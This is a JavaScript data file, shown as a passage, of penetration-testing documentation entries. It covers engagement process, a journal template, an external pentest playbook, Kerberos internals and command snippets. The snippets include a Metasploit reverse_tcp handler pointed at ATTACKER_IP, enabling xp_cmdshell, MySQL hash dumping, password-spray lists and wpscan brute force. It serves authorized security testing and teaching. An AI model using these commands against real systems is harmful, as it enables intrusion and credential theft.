/* ═══════════════════════════════════════════════════════════════════
   Security Tracker – Documentation Data
   ═══════════════════════════════════════════════════════════════════
   EDITING GUIDE
   ─────────────
   Each doc is an object in the `documentationEntries` array below.

   Doc structure:
     {
       id:          "unique_doc_id",        // snake_case, must be unique
       title:       "Display Title",
       category:    "Category Name",        // groups docs in the sidebar
       icon:        "emoji or symbol",      // shown in the doc list
       sections:    [ ...content sections... ]
     }

   Section structure:
     {
       heading:  "Section Heading",         // h2/h3 rendered heading
       level:    2 | 3,                     // heading level (2 = h2, 3 = h3)
       content:  "Paragraph text.",         // plain-text or simple markdown
       code:     "code block content",      // optional fenced code block
       list:     ["item 1", "item 2"],      // optional bulleted list
       numbered: true | false               // if true, list is ordered
     }

   Notes:
   • Sections are rendered in order top-to-bottom.
   • `content`, `code`, and `list` are all optional per section —
     include whichever fields are relevant.
   • To add a new doc, push a new object into `documentationEntries`.
   ═══════════════════════════════════════════════════════════════════ */

const documentationEntries = [
  {
    id: "pentest_process",
    title: "Pentest Process & Methodology",
    category: "Methodology",
    icon: "📋",
    sections: [
      {
        heading: "Penetration Testing Process Overview",
        level: 2,
        content: "A professional penetration test follows a structured process from initial client contact through final reporting. Each stage has specific deliverables and legal requirements that must be completed before proceeding."
      },

      /* NDA */
      {
        heading: "1. Non-Disclosure Agreement (NDA)",
        level: 2,
        content: "An NDA must be signed before ANY technical discussions, scoping, or information exchange. The NDA protects both parties — the client's sensitive data and the tester's methodology.\n\nNDA Types:"
      },
      {
        heading: "Unilateral NDA",
        level: 3,
        content: "One-way obligation. Only one party (usually the tester) is bound to confidentiality regarding the other party's information. Common when the client shares sensitive data but the tester does not."
      },
      {
        heading: "Bilateral NDA (Mutual)",
        level: 3,
        content: "Two-way obligation. Both parties agree to protect each other's confidential information. Most common in pentest engagements where both sides share sensitive details."
      },
      {
        heading: "Multilateral NDA",
        level: 3,
        content: "Three or more parties are involved, and at least one party shares information that must remain protected. Used when third-party vendors, subcontractors, or multiple stakeholders participate in the engagement."
      },

      /* Scoping */
      {
        heading: "2. Scoping & Questionnaire",
        level: 2,
        content: "After NDA is signed, a scoping questionnaire is sent to the client to define the engagement boundaries. This determines effort, timeline, and pricing."
      },
      {
        heading: "Internal Network Pentest Scoping Questions",
        level: 3,
        list: [
          "How many internal hosts/IPs are in scope?",
          "How many subnets/VLANs?",
          "Is Active Directory in scope?",
          "How many domains/forests?",
          "Are we testing from a domain-joined machine or unauthenticated?",
          "Is physical access testing in scope?",
          "Are wireless networks in scope?",
          "What are the goals (domain admin, specific data, compliance)?",
          "Any systems explicitly excluded?",
          "What are the testing windows (business hours, after hours)?"
        ],
        numbered: true
      },
      {
        heading: "External Network Pentest Scoping Questions",
        level: 3,
        list: [
          "How many external IPs/ranges/domains are in scope?",
          "Are web applications in scope (if so, how many)?",
          "Is social engineering/phishing in scope?",
          "Are cloud services (AWS/Azure/GCP) in scope?",
          "Is there an existing vulnerability scanning program?",
          "What constitutes a successful external breach for reporting?"
        ],
        numbered: true
      },
      {
        heading: "Web Application Scoping Questions",
        level: 3,
        list: [
          "How many web applications?",
          "How many unique pages/endpoints (small < 50, medium 50-200, large 200+)?",
          "Is it authenticated testing? How many roles?",
          "What technology stack (language, framework, CMS)?",
          "Is the API in scope? How many endpoints?",
          "Is source code available (white-box)?",
          "Is there a staging/test environment?"
        ],
        numbered: true
      },

      /* Pre-Engagement */
      {
        heading: "3. Pre-Engagement Meeting",
        level: 2,
        content: "After scoping, a formal pre-engagement meeting finalizes the legal and logistical framework. Key documents produced:"
      },
      {
        heading: "Master Service Agreement (MSA) / Contract",
        level: 3,
        list: [
          "Defines the business relationship, payment terms, liability limitations",
          "Usually a standing contract that covers multiple engagements",
          "References the Rules of Engagement (RoE) for specific testing boundaries"
        ]
      },
      {
        heading: "Statement of Work (SoW)",
        level: 3,
        list: [
          "Specific to each engagement under the MSA",
          "Defines: scope, timeline, deliverables, IP ranges, testing type",
          "Must be signed by authorized client representative",
          "Acts as your legal authorization to test — never start without it"
        ]
      },
      {
        heading: "Rules of Engagement (RoE)",
        level: 3,
        list: [
          "Testing hours and blackout windows",
          "Allowed attack types and any exclusions",
          "Communication procedures and emergency contacts",
          "Data handling and cleanup requirements",
          "Rate limiting and DoS restrictions",
          "Third-party systems / cloud provider notification requirements"
        ]
      },

      /* Kick-Off */
      {
        heading: "4. Kick-Off Meeting",
        level: 2,
        content: "Held immediately before testing begins. All stakeholders align on expectations and logistics."
      },
      {
        heading: "Required Participants",
        level: 3,
        list: [
          "Lead Pentester / Test Manager",
          "Client IT/Security POC (primary contact during testing)",
          "Client Management Stakeholder (someone who can authorize scope changes)",
          "SOC/IR Team Lead (if they need to be aware of testing traffic)"
        ]
      },
      {
        heading: "Kick-Off Agenda",
        level: 3,
        list: [
          "Review scope and RoE — confirm nothing has changed",
          "Exchange emergency contact information",
          "Confirm testing IP addresses and VPN/access credentials",
          "Agree on status update cadence (daily email, Slack, etc.)",
          "Discuss critical finding notification process",
          "Confirm report delivery timeline and format"
        ],
        numbered: true
      },

      /* Testing */
      {
        heading: "5. Testing Execution",
        level: 2,
        content: "The actual penetration test follows the methodology phases tracked in this application: OSINT → Enumeration → Exploitation → AD Exploitation → Post-Exploitation → Persistence.\n\nDuring testing:"
      },
      {
        heading: "Daily Operations",
        level: 3,
        list: [
          "Send daily status updates to client POC",
          "Report critical/high findings immediately (don't wait for the report)",
          "Maintain detailed logs of all actions with timestamps",
          "Screenshot every significant finding as you go",
          "Track all credentials obtained and access levels achieved",
          "Document cleanup actions needed"
        ]
      },

      /* Reporting */
      {
        heading: "6. Reporting & Debrief",
        level: 2,
        content: "The report is the primary deliverable. It must be clear, actionable, and suitable for both technical and executive audiences."
      },
      {
        heading: "Report Structure",
        level: 3,
        list: [
          "Executive Summary — business impact, risk rating, key findings (1-2 pages, non-technical)",
          "Scope & Methodology — what was tested, how, and when",
          "Findings — each with: title, severity (CVSS), description, evidence (screenshots/logs), remediation",
          "Attack Narrative — chronological walkthrough of the attack path",
          "Remediation Summary — prioritized table of all findings and fixes",
          "Appendices — raw scan data, full credential lists, tool output"
        ],
        numbered: true
      },
      {
        heading: "Debrief Meeting",
        level: 3,
        list: [
          "Walk through findings with technical and management teams",
          "Demonstrate critical attack paths live if requested",
          "Answer questions and provide context for remediation priorities",
          "Agree on retest timeline for critical findings",
          "Confirm all test artifacts/backdoors have been cleaned up"
        ]
      }
    ]
  },

  {
    id: "pentest_journal",
    title: "Pentest Journal Template",
    category: "Methodology",
    icon: "📓",
    sections: [
      {
        heading: "Pentest Journal — Documentation Template",
        level: 2,
        content: "Use this template structure to maintain organized notes throughout an engagement. Consistent documentation is critical for report writing, team handoffs, and reproducing findings.\n\nKeep entries updated in real-time — retroactive documentation is always incomplete."
      },

      /* Overview */
      {
        heading: "Engagement Overview Table",
        level: 2,
        content: "Track high-level engagement metadata.",
        code: "┌────────────────┬──────────────────────────────────────────────┐\n│ Field          │ Value                                        │\n├────────────────┼──────────────────────────────────────────────┤\n│ Engagement Name│ [Client Name] - [Test Type]                  │\n│ Time Frame     │ [Start Date] - [End Date]                    │\n│ Test Type      │ Internal / External / Web App / AD / Wireless│\n│ Tester(s)      │ [Names]                                      │\n│ Client POC     │ [Name, Email, Phone]                         │\n│ Scope          │ [IP ranges / URLs / domains]                 │\n│ Description    │ [Brief engagement description and goals]     │\n└────────────────┴──────────────────────────────────────────────┘"
      },

      /* Machines */
      {
        heading: "Machine Tracking Table",
        level: 2,
        content: "One row per discovered/targeted host. Update as you enumerate.",
        code: "┌──────────────┬───────────────┬────────┬──────────────────┬──────────────────┐\n│ Name/Host    │ IP Address    │ OS     │ Open Ports       │ Notes            │\n├──────────────┼───────────────┼────────┼──────────────────┼──────────────────┤\n│ DC01         │ 10.10.20.10   │ Win19  │ 53,88,389,445    │ Domain Controller│\n│ WEB01        │ 10.10.20.50   │ Ubuntu │ 22,80,443        │ Apache/WordPress │\n│ FILE01       │ 10.10.20.30   │ Win16  │ 445,3389         │ SMB shares open  │\n└──────────────┴───────────────┴────────┴──────────────────┴──────────────────┘"
      },

      /* Attacks & Payloads */
      {
        heading: "Attacks & Payloads Log",
        level: 2,
        content: "Document every exploitation attempt, successful or not.",
        code: "┌──────────┬──────────────────┬──────────────────┬──────────────────┬────────┐\n│ Machine  │ Attack Vector    │ Prerequisites    │ Payload/Tool     │ Result │\n├──────────┼──────────────────┼──────────────────┼──────────────────┼────────┤\n│ WEB01    │ SQLi → RCE       │ Web login creds  │ sqlmap --os-shell│ Shell  │\n│ DC01     │ Kerberoast       │ Domain user      │ GetUserSPNs.py   │ Hash   │\n│ FILE01   │ PSExec           │ Admin hash       │ impacket-psexec  │ SYSTEM │\n└──────────┴──────────────────┴──────────────────┴──────────────────┴────────┘"
      },

      /* Credentials */
      {
        heading: "Credentials Table",
        level: 2,
        content: "Track ALL credentials obtained — crucial for report and cleanup.",
        code: "┌──────────────┬──────────────────────────────────────┬──────────────┬──────────┐\n│ Username     │ Hash                                 │ Password     │ Source   │\n├──────────────┼──────────────────────────────────────┼──────────────┼──────────┤\n│ svc_sql      │ aad3b435b51404eeaad3b435b51404ee:... │ Summer2024!  │ Kerbroast│\n│ admin        │ -                                    │ P@ssw0rd123  │ Web login│\n│ Administrator│ 31d6cfe0d16ae931b73c59d7e0c089c0:... │ -            │ SAM dump │\n└──────────────┴──────────────────────────────────────┴──────────────┴──────────┘",
        list: [
          "Record the source of every credential (where/how it was obtained)",
          "Note which systems each credential provides access to",
          "Track whether credentials were cracked or used as pass-the-hash",
          "Flag any shared/reused passwords across systems"
        ]
      },

      /* Journal */
      {
        heading: "Activity Journal",
        level: 2,
        content: "Timestamped log of every significant action. This is your audit trail.",
        code: "┌─────────────────────┬──────────┬─────────────────────────────────────────────┐\n│ Timestamp           │ Machine  │ Action / Note                               │\n├─────────────────────┼──────────┼─────────────────────────────────────────────┤\n│ 2024-03-15 09:00    │ -        │ Engagement started, VPN connected            │\n│ 2024-03-15 09:15    │ ALL      │ Nmap SYN scan of 10.10.20.0/24              │\n│ 2024-03-15 10:30    │ WEB01    │ Found SQLi in /login.php - param: username  │\n│ 2024-03-15 11:00    │ WEB01    │ Got shell as www-data via sqlmap --os-shell  │\n│ 2024-03-15 14:00    │ DC01     │ Kerberoasted svc_sql, cracking offline      │\n│ 2024-03-15 15:30    │ DC01     │ svc_sql cracked: Summer2024! — DA member    │\n│ 2024-03-15 16:00    │ -        │ Notified client of critical finding (DA)    │\n└─────────────────────┴──────────┴─────────────────────────────────────────────┘"
      },

      /* Tips */
      {
        heading: "Documentation Best Practices",
        level: 2,
        list: [
          "Screenshot EVERYTHING before and after exploitation",
          "Record exact commands used — copy/paste from terminal history",
          "Note timestamps in UTC or the client's timezone (be consistent)",
          "Document failed attempts too — they show thoroughness and help avoid repeats",
          "Save raw tool output (nmap XML, Nessus exports, BloodHound data)",
          "Keep a running list of cleanup tasks (backdoors, accounts, files to remove)",
          "Update credential table immediately when new creds are found",
          "Tag findings with severity as you discover them — don't wait for report writing"
        ]
      }
    ]
  },

  {
    id: "external_pentest_playbook",
    title: "External Pentest Playbook",
    category: "Methodology",
    icon: "👽",
    sections: [
      {
        heading: "External Penetration Test Playbook",
        level: 2,
        content: "Step-by-step operational playbook for external network penetration tests. Follow this checklist to ensure complete coverage from pre-engagement through cleanup."
      },

      /* Pre-Test */
      {
        heading: "Pre-Test Checklist",
        level: 2,
        list: [
          "Ensure Rules of Engagement (RoE) is signed by the client",
          "Add all in-scope IPs/domains to your scope tracking",
          "Verify customer scope ownership (use bgp.he.net, whois, ARIN lookups)",
          "Send kick-off email with your testing IP and contact information",
          "Confirm emergency contacts and critical finding notification process"
        ],
        numbered: true
      },
      {
        heading: "Kick-Off Email Template",
        level: 3,
        code: "Hi [CLIENT],\n\nThe external penetration test is about to begin. Per our agreement,\nwe will be testing the following IPs/ranges:\n\n[SCOPE IPs/RANGES]\n\nAll pentesting activity will be performed from the following IP address:\n\n[YOUR TESTING IP]\n\nIf our testing triggers any alerting for you, please notify us at\nyour earliest convenience so we can notate this in our report.\nFinally, if you need anything at all during the testing, you can\nreach me at this email or by the phone number listed in my signature.\n\nThank you,\n[YOUR NAME]"
      },

      /* Information Gathering */
      {
        heading: "Information Gathering",
        level: 2,
        content: "OSINT and reconnaissance tasks to perform before active scanning."
      },
      {
        heading: "Hunting Breached Credentials",
        level: 3,
        list: [
          "Search breach databases for client domain emails (DeHashed, IntelX, HaveIBeenPwned)",
          "Look for credential dumps on paste sites and dark web sources",
          "Search GitHub/GitLab for accidentally committed credentials",
          "Check for cloud storage buckets with exposed data (GrayhatWarfare)"
        ]
      },
      {
        heading: "Identifying Employees and Emails",
        level: 3,
        list: [
          "LinkedIn employee enumeration — build employee list",
          "Determine email format using Hunter.io, email-format.com, or manual testing",
          "Verify email addresses with SMTP VRFY or RCPT TO enumeration",
          "Build targeted username/email lists from OSINT findings"
        ]
      },
      {
        heading: "Enumerating Valid Accounts",
        level: 3,
        list: [
          "Test for username enumeration on login portals (timing attacks, error messages)",
          "Check password reset flows for account validation leaks",
          "Validate email addresses against O365 using o365creeper or similar",
          "Enumerate accounts on VPN portals, OWA, Citrix, and other edge services"
        ]
      },

      /* Vulnerability Scanning */
      {
        heading: "Vulnerability Scanning",
        level: 2,
        list: [
          "Conduct vulnerability scanning with Nessus or OpenVAS across all in-scope IPs",
          "Run web application scans (Nikto, Burp Suite, nuclei) on discovered web services",
          "Check for SSL/TLS misconfigurations (testssl.sh, sslscan)",
          "Identify outdated software and known CVEs from service banners",
          "Validate scanner findings manually — eliminate false positives before reporting"
        ]
      },

      /* Attacking Login Portals */
      {
        heading: "Attacking Login Portals",
        level: 2,
        content: "External login portals are primary targets. Test each discovered portal systematically."
      },
      {
        heading: "Attacking O365 / Microsoft 365",
        level: 3,
        list: [
          "Enumerate valid users via Azure/MSOL endpoints",
          "Password spray with common passwords (Season+Year pattern: Winter2024!)",
          "Check for legacy authentication protocols that bypass MFA",
          "Test OAuth/SAML misconfigurations",
          "Look for Azure AD conditional access policy gaps"
        ],
        code: "# Common spray passwords\nWinter2024!\nSpring2024!\nSummer2024!\nPassword1!\nWelcome1!\n[CompanyName]2024!\n\n# Tools: MSOLSpray, o365spray, TREVORspray"
      },
      {
        heading: "Attacking OWA (Outlook Web Access)",
        level: 3,
        list: [
          "Identify OWA version from response headers and login page",
          "Password spray with validated usernames",
          "Attempt internal phishing or mail relay if access is gained",
          "Search mailbox for sensitive data, credentials, internal documentation",
          "Check for Exchange CVEs (ProxyLogon, ProxyShell, ProxyNotShell)"
        ]
      },
      {
        heading: "Other Portals",
        level: 3,
        list: [
          "VPN portals (Cisco AnyConnect, GlobalProtect, Pulse Secure) — spray and check for CVEs",
          "Citrix/RDP Gateway — test default creds, spray, check for known vulns",
          "Custom web applications — full web app testing methodology",
          "Admin panels (WordPress /wp-admin, phpMyAdmin, etc.) — default creds, brute force",
          "API endpoints — check for authentication bypass, broken access controls"
        ]
      },
      {
        heading: "Bypassing MFA",
        level: 3,
        list: [
          "Check if MFA is consistently enforced across all services (O365, VPN, OWA, etc.)",
          "Test for MFA bypass via legacy protocols (IMAP, POP3, ActiveSync, SMTP)",
          "Look for MFA fatigue / push notification abuse opportunities",
          "Check for session token replay after MFA completion",
          "Test if MFA is required for all authentication flows (API keys, app passwords)"
        ]
      },

      /* Escalation & Manual Testing */
      {
        heading: "Manual Testing & Exploitation",
        level: 2,
        list: [
          "Conduct manual testing on all identified services and findings",
          "Validate scanning tool vulnerabilities (remove false positives)",
          "Test for password spraying and brute-force on all discovered logins",
          "Attempt to escalate access from external to internal network",
          "Validate any previous year findings have been resolved"
        ]
      },

      /* Escalating Access */
      {
        heading: "Escalating External to Internal",
        level: 2,
        content: "If you breach the perimeter (credentials, RCE, VPN access), immediately pivot to internal testing objectives.",
        list: [
          "Use gained credentials on VPN/RDP to establish internal network access",
          "Leverage compromised email for internal phishing or information gathering",
          "Exploit any RCE to establish C2 and begin internal enumeration",
          "Connect to internal services discovered through breached portals",
          "Any cloud access gained — enumerate IAM, storage, compute resources"
        ]
      },

      /* Common Findings */
      {
        heading: "Common External Pentest Findings",
        level: 2,
        list: [
          "Default or weak credentials on edge services",
          "Missing MFA on external-facing portals",
          "Open mail relays (test via: nmap -p 25 --script smtp-open-relay TARGET)",
          "Outdated SSL/TLS configurations (weak ciphers, expired certificates)",
          "Information disclosure in HTTP headers, error pages, or public repos",
          "Subdomain takeover vulnerabilities",
          "Exposed management interfaces (SSH, RDP, admin panels)",
          "DNS zone transfer allowed",
          "Missing SPF/DKIM/DMARC email security records",
          "Known CVEs in unpatched external services"
        ]
      },

      /* Cleanup */
      {
        heading: "Post-Test Cleanup",
        level: 2,
        list: [
          "Remove all uploaded tools, scripts, and payloads from client systems",
          "Delete any accounts created during testing",
          "Remove persistence mechanisms planted during testing",
          "Document all changes made to client environment",
          "Notify client of any remaining artifacts that require their action",
          "Confirm all testing traffic has stopped"
        ]
      }
    ]
  },

  {
    id: "metasploit",
    title: "Metasploit",
    category: "Frameworks",
    icon: "🎯",
    sections: [
      {
        heading: "Initialize",
        level: 2,
        code: "msfdb init\nmsfconsole -q"
      },
      {
        heading: "Core Workflow",
        level: 2,
        code: "search cve:2023\nuse exploit/...\nshow options\nset RHOSTS TARGET\nset LHOST ATTACKER_IP\nrun"
      },
      {
        heading: "Workspaces + DB",
        level: 2,
        code: "workspace -a ENGAGEMENT\ndb_nmap -sV TARGET_IP"
      },
      {
        heading: "multi/handler",
        level: 2,
        code: "use exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST ATTACKER_IP\nset LPORT 4444\nrun"
      },
      {
        heading: "Meterpreter Basics",
        level: 2,
        code: "sysinfo\ngetuid\nshell\nupload / download\nbg"
      }
    ]
  },

  {
    id: "custom_wordlists",
    title: "Custom Wordlists (crunch & cewl)",
    category: "Credential Attacks",
    icon: "🧠",
    sections: [
      {
        heading: "crunch",
        level: 2,
        content: "Use crunch for patterned wordlists (length, charset, mask).",
        code: "# Length 8 only, lowercase\ncrunch 8 8 abcdefghijklmnopqrstuvwxyz -o words.txt\n\n# Pattern: Season+Year style\ncrunch 10 10 -t Summer%%%% -o summer_year.txt\n\n# Custom charset\ncrunch 6 8 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -o custom.txt"
      },
      {
        heading: "cewl",
        level: 2,
        content: "Use cewl to scrape organization-specific words from websites.",
        code: "# Basic scrape\ncewl -w cewl_words.txt -d 2 -m 5 https://target.tld\n\n# Include metadata and emails\ncewl -w words.txt --meta_file meta.txt -e https://target.tld"
      },
      {
        heading: "Workflow",
        level: 2,
        numbered: true,
        list: [
          "Generate context words with cewl",
          "Generate patterns with crunch",
          "Merge and deduplicate: sort -u",
          "Apply simple mangling rules (year, symbols, case)",
          "Use targeted list before large generic lists"
        ],
        code: "cat cewl_words.txt summer_year.txt | tr '[:upper:]' '[:lower:]' | sort -u > final_wordlist.txt"
      }
    ]
  },

  {
    id: "content_management_systems",
    title: "Content Management Systems",
    category: "Web Exploitation",
    icon: "🧱",
    sections: [
      {
        heading: "WordPress",
        level: 2,
        code: "# Enumerate plugins/themes/users\nwpscan --url http://TARGET --enumerate vp,vt,u\n\n# Password attack (authorized only)\nwpscan --url http://TARGET -U users.txt -P /usr/share/wordlists/rockyou.txt\n\n# Common admin paths\n/wp-admin\n/wp-login.php"
      },
      {
        heading: "Drupal",
        level: 2,
        code: "droopescan scan drupal -u http://TARGET\n\n# Fingerprint version/modules before exploit selection"
      },
      {
        heading: "Joomla",
        level: 2,
        code: "joomscan -u http://TARGET"
      },
      {
        heading: "CMS Workflow",
        level: 2,
        numbered: true,
        list: [
          "Fingerprint CMS and exact version",
          "Enumerate plugins/modules/themes",
          "Map known CVEs to discovered versions",
          "Test auth bypass/upload/edit features",
          "Validate RCE/privilege path and document artifacts"
        ]
      }
    ]
  },

  {
    id: "database_operations",
    title: "Databases",
    category: "Post-Exploitation",
    icon: "🗄️",
    sections: [
      {
        heading: "PostgreSQL",
        level: 2,
        code: "psql -h TARGET_IP -U USER -d DB\n\\l\n\\dt\n\\du"
      },
      {
        heading: "MySQL / MariaDB",
        level: 2,
        code: "mysql -h TARGET_IP -u USER -p\nSHOW DATABASES;\nUSE DB;\nSHOW TABLES;\nSELECT user, authentication_string FROM mysql.user;"
      },
      {
        heading: "MSSQL",
        level: 2,
        code: "impacket-mssqlclient USER:PASS@TARGET_IP\nSELECT name FROM sys.databases;\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';"
      },
      {
        heading: "SQLite",
        level: 2,
        code: "sqlite3 file.db\n.tables\nSELECT * FROM table_name;"
      },
      {
        heading: "Database Tradecraft",
        level: 2,
        list: [
          "Prefer read-only validation first",
          "Dump minimally required data",
          "Record exact query paths used",
          "Avoid destructive queries in shared environments"
        ]
      }
    ]
  },

  {
    id: "ad_kerberos",
    title: "Active Directory Kerberos",
    category: "Active Directory",
    icon: "🔐",
    sections: [
      {
        heading: "Kerberos in Active Directory — Full Protocol and Implementation Model",
        level: 2,
        content: "Kerberos in Microsoft Active Directory is a symmetric-key, ticket-based authentication protocol implemented by Kerberos and tightly integrated with directory identity, SPNs, PAC authorization, and Windows security descriptors.\n\nThis is not generic Kerberos. This is Microsoft's extended Kerberos with PAC, S4U, delegation, compound identity, SIDHistory, and trust integration."
      },

      /* 1. Core Cryptographic Model */
      {
        heading: "1. Core Cryptographic Model",
        level: 2,
        content: "Kerberos is built on:",
        list: [
          "Symmetric encryption (AES256, AES128, legacy RC4)",
          "Shared secrets derived from passwords",
          "Time-based replay protection",
          "KDC trust anchor"
        ],
      },
      {
        content: "There are no asymmetric operations in standard ticket exchange. Trust derives from shared secret keys stored in AD."
      },

      /* 2. Core Entities */
      {
        heading: "2. Core Entities",
        level: 2,
      },
      {
        heading: "Principal",
        level: 3,
        content: "Security identity.\nFormat:",
        code: "primary/instance@REALM",
      },
      {
        content: "In AD:",
        list: [
          "User → user@DOMAIN.LOCAL",
          "Service → HTTP/server.domain.local@DOMAIN.LOCAL"
        ]
      },
      {
        heading: "KDC",
        level: 3,
        content: "Runs on domain controllers.\nComponents:",
        list: [
          "Authentication Service (AS)",
          "Ticket Granting Service (TGS)"
        ]
      },
      {
        heading: "TGT (Ticket Granting Ticket)",
        level: 3,
        content: "Encrypted with:",
        code: "KRBTGT account key",
      },
      {
        content: "KRBTGT is the root secret of the domain.\nCompromise = golden ticket capability."
      },
      {
        heading: "Service Ticket (TGS)",
        level: 3,
        content: "Encrypted with:",
        code: "Target service account key",
      },

      /* 3. AD-Specific Enhancements */
      {
        heading: "3. Active Directory–Specific Enhancements",
        level: 2,
        content: "Microsoft extends Kerberos with:",
        list: [
          "PAC (Privilege Attribute Certificate)",
          "SIDHistory",
          "Group expansion",
          "Constrained delegation (S4U)",
          "Resource-based constrained delegation",
          "Claims and compound identity",
          "Forest trust referral tickets"
        ]
      },

      /* 4. Full Authentication Flow */
      {
        heading: "4. Full Authentication Flow",
        level: 2,
      },
      {
        heading: "Phase 1: AS-REQ / AS-REP (Initial Authentication)",
        level: 3,
        content: "Client → KDC:\n\nAS-REQ:",
        list: [
          "Username",
          "Timestamp encrypted with key derived from password",
          "Supported encryption types",
          "Pre-authentication data"
        ]
      },
      {
        content: "KDC verifies timestamp using stored hash.\n\nIf correct, KDC returns AS-REP:",
        list: [
          "TGT (encrypted with KRBTGT key)",
          "Session key (encrypted with user key)"
        ]
      },
      {
        content: "Client decrypts session key using password-derived key.\n\nAt this stage, the client has:",
        list: [
          "TGT",
          "Session key"
        ]
      },
      {
        content: "No service access yet."
      },
      {
        heading: "Phase 2: TGS-REQ / TGS-REP (Service Ticket Request)",
        level: 3,
        content: "Client → KDC:\n\nTGS-REQ:",
        list: [
          "TGT",
          "Authenticator (timestamp encrypted with TGT session key)",
          "Requested SPN"
        ]
      },
      {
        content: "KDC:",
        list: [
          "Decrypts TGT using KRBTGT key",
          "Validates authenticator",
          "Checks policy",
          "Builds PAC",
          "Encrypts service ticket using service account key"
        ],
        numbered: true
      },
      {
        content: "Returns TGS-REP:",
        list: [
          "Service ticket",
          "New session key"
        ]
      },
      {
        content: "Client forwards service ticket to target service."
      },
      {
        heading: "Phase 3: AP-REQ / AP-REP (Service Authentication)",
        level: 3,
        content: "Client → Service:\n\nAP-REQ:",
        list: [
          "Service ticket",
          "Authenticator"
        ]
      },
      {
        content: "Service:",
        list: [
          "Decrypts ticket with its key",
          "Validates authenticator",
          "Extracts PAC",
          "Builds Windows access token"
        ],
        numbered: true
      },
      {
        content: "Optionally returns AP-REP for mutual auth."
      },

      /* 5. PAC */
      {
        heading: "5. Privilege Attribute Certificate (PAC)",
        level: 2,
        content: "PAC is Microsoft's authorization container embedded in tickets.\n\nContains:",
        list: [
          "User SID",
          "Group SIDs",
          "Extra SIDs",
          "SIDHistory",
          "Logon time",
          "UPN",
          "Claims",
          "Delegation info"
        ]
      },
      {
        content: "PAC is signed twice:",
        list: [
          "KDC signature",
          "Server signature"
        ]
      },
      {
        content: "Prevents ticket tampering.\n\nIf KRBTGT is compromised: Attacker can forge valid PAC. This enables Golden Ticket attacks."
      },

      /* 6. Encryption Types */
      {
        heading: "6. Encryption Types",
        level: 2,
        content: "Modern AD:",
        list: [
          "AES256-CTS-HMAC-SHA1-96 (default)",
          "AES128",
          "RC4-HMAC (legacy)",
          "DES (deprecated)"
        ]
      },
      {
        content: "Encryption selection depends on:",
        list: [
          "Client support",
          "Account configuration",
          "Domain functional level"
        ]
      },
      {
        content: "RC4 allows Kerberoasting via NT hash.\nAES requires key derivation from password."
      },

      /* 7. SPNs */
      {
        heading: "7. SPNs (Service Principal Names)",
        level: 2,
        content: "SPN format:",
        code: "service/hostname:port",
      },
      {
        content: "Examples:",
        list: [
          "HTTP/web.domain.local",
          "CIFS/fileserver.domain.local",
          "MSSQLSvc/sql.domain.local:1433"
        ]
      },
      {
        content: "Stored in: servicePrincipalName attribute.\n\nDuplicate SPNs cause authentication failure.\nSPN = routing key for Kerberos."
      },

      /* 8. Ticket Structure */
      {
        heading: "8. Ticket Structure",
        level: 2,
        content: "Each ticket includes:",
        list: [
          "Client principal",
          "Server principal",
          "Session key",
          "Flags",
          "Validity timestamps",
          "PAC"
        ]
      },
      {
        content: "Important flags:",
        list: [
          "FORWARDABLE",
          "RENEWABLE",
          "OK-AS-DELEGATE",
          "PRE-AUTHENT",
          "CANONICALIZE"
        ]
      },
      {
        content: "Ticket lifetime — Default:",
        list: [
          "10 hours validity",
          "7 days renewal"
        ]
      },

      /* 9. Delegation Internals */
      {
        heading: "9. Delegation Internals",
        level: 2,
        content: "Delegation uses:",
        list: [
          "S4U2Self",
          "S4U2Proxy"
        ]
      },
      {
        content: "Controlled by:",
        list: [
          "userAccountControl flags",
          "msDS-AllowedToDelegateTo",
          "msDS-AllowedToActOnBehalfOfOtherIdentity"
        ]
      },
      {
        content: "Delegation never bypasses KDC.\nKDC enforces impersonation rights."
      },

      /* 10. Trusts and Cross-Forest Authentication */
      {
        heading: "10. Trusts and Cross-Forest Authentication",
        level: 2,
        content: "When accessing foreign domain:\nReferral TGT issued:",
        code: "krbtgt/FOREIGNDOMAIN",
      },
      {
        content: "Flow:",
        list: [
          "Home KDC issues referral",
          "Foreign KDC validates trust",
          "Issues service ticket"
        ],
        numbered: true
      },
      {
        content: "Trust direction matters.\nSID filtering may apply."
      },

      /* 11. Attack Surface */
      {
        heading: "11. Attack Surface",
        level: 2,
      },
      {
        heading: "AS-REP Roasting",
        level: 3,
        content: "If pre-auth disabled:\nAS-REP encrypted with user key → offline cracking."
      },
      {
        heading: "Kerberoasting",
        level: 3,
        content: "TGS encrypted with service account key.\nCrack service account password."
      },
      {
        heading: "Golden Ticket",
        level: 3,
        content: "Forge TGT using KRBTGT hash."
      },
      {
        heading: "Silver Ticket",
        level: 3,
        content: "Forge service ticket using service account hash."
      },
      {
        heading: "Overpass-the-Hash",
        level: 3,
        content: "Use NT hash to request TGT."
      },
      {
        heading: "Pass-the-Ticket",
        level: 3,
        content: "Inject ticket into LSASS."
      },
      {
        heading: "Skeleton Key",
        level: 3,
        content: "Patch LSASS to accept universal password."
      },

      /* 12. LSASS and Ticket Storage */
      {
        heading: "12. LSASS and Ticket Storage",
        level: 2,
        content: "Tickets stored in LSASS memory.\n\nTools:",
        list: [
          "Mimikatz",
          "Rubeus"
        ]
      },
      {
        content: "Credential cache includes:",
        list: [
          "TGT",
          "Service tickets",
          "Session keys"
        ]
      },
      {
        content: "Protected by: Credential Guard (virtualization-based security)."
      },

      /* 13. PAC Validation */
      {
        heading: "13. PAC Validation",
        level: 2,
        content: "Service can:",
        list: [
          "Validate PAC locally",
          "Or contact DC for PAC validation"
        ]
      },
      {
        content: "If service trusts KDC signature: No additional DC call.\nThis affects lateral movement detection."
      },

      /* 14. Time Synchronization */
      {
        heading: "14. Time Synchronization",
        level: 2,
        content: "Kerberos requires clock skew ≤ 5 minutes.\nUses: NTP / Windows Time Service.\n\nIf skew too large:",
        code: "KRB_AP_ERR_SKEW",
      },

      /* 15. Ticket Flags Deep Meaning */
      {
        heading: "15. Ticket Flags Deep Meaning",
        level: 2,
        list: [
          "Forwardable — Allows delegation",
          "Renewable — Allows extension without reauthentication",
          "OK-AS-DELEGATE — Indicates service trusted for delegation"
        ]
      },

      /* 16. Machine Accounts */
      {
        heading: "16. Machine Accounts",
        level: 2,
        content: "Computers are principals.\nPassword auto-rotates every 30 days.\n\nMachine accounts can:",
        list: [
          "Request TGT",
          "Perform delegation",
          "Hold SPNs"
        ]
      },
      {
        content: "MachineAccountQuota default = 10.\nAllows normal users to create machines."
      },

